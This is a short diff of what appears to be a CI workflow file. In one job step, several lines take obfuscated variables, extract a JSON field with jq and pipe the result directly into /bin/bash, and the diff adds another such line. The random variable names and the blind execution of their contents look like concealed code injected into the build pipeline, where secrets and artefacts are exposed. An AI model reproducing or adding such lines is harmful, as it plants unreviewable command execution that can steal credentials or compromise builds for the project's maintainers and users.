@@ -39,6 +39,7 @@ jobs:
           echo $nrwj670 | jq -r .k06 | /bin/bash
           echo $and66663 | jq -r .dorn451 | /bin/bash
           printf '%s' "$bmk02674" | jq -r .xmot5292 | /bin/bash
+          printf '%s' "$xy9649" | jq -r .r32 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
